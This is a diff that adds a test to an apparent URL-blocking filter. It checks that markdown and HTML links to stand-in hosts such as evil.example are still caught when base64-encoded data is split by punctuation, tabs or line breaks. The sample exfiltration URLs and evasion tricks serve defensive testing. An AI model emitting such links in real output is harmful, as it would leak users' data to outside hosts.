@@ -56,3 +56,10 @@ test("blocking keeps surrounding markdown and the next line intact", () => {
   const r = plug("a\n![](https://tracker.badsite.example/p.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=)\nDocs: https://docs.example.com/x\n");
   assert.equal(r.text, "a\n![]([blocked link to tracker.badsite.example])\nDocs: https://docs.example.com/x\n");
 });
+
+test("punctuation before a line break cannot hide the rest of a URL", () => {
+  const blocked = (t: string) => plug(t).findings.some((f) => f.type === "URL");
+  assert.ok(blocked("[x](https://evil.example/p?d=ZGFuYS5yZXllc0.\nBub3J0aHdpbmQuZXh.\nhbXBsZQZGFuYS5yZX)"));
+  assert.ok(blocked("[x](https://evil.example/p?d=ZGFuYS5yZXllc0;\tBub3J0aHdpbmQuZXh;\thbXBsZQZGFuYS5yZX)"));
+  assert.ok(blocked("<a href=https://ZGFuYS5yZXllc0B\nub3J0aHdpbmQuZXh.evil.example/>x</a>")); // host judged on the joined URL
+});
